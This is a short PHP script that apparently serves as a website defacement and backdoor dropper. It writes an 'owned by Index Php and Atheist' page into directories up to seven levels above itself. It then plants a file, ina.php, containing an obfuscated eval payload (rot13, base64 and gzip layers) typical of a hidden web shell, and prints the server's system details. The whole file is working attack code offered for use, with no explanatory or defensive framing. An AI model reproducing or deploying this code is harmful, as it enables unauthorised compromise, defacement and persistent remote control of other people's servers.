<?php
$index = fopen('../ina.htm', 'w');
fwrite($index, '<b>owned by Index Php and Atheist<b>');
fclose($index);

$index = fopen('../../ina.htm', 'w');
fwrite($index, '<b>owned by Index Php and Atheist<b>');
fclose($index);

$index = fopen('../../../ina.htm', 'w');
fwrite($index, '<b>owned by Index Php and Atheist<b>');
fclose($index);

$index = fopen('../../../../ina.htm', 'w');
fwrite($index, '<b>owned by Index Php and Atheist<b>');
fclose($index);

$index = fopen('../../../../../ina.htm', 'w');
fwrite($index, '<b>owned by Index Php and Atheist<b>');
fclose($index);

$index = fopen('../../../../../../ina.htm', 'w');
fwrite($index, '<b>owned by Index Php and Atheist<b>');
fclose($index);

$index = fopen('../../../../../../../ina.htm', 'w');
fwrite($index, '<b>owned by Index Php and Atheist<b>');
fclose($index);

$index = fopen('./ina.php', 'w');
fwrite($index, '<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJDT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>');
fclose($index);

echo '<center><font color=red><br>'.php_uname().'</font></center>'
?>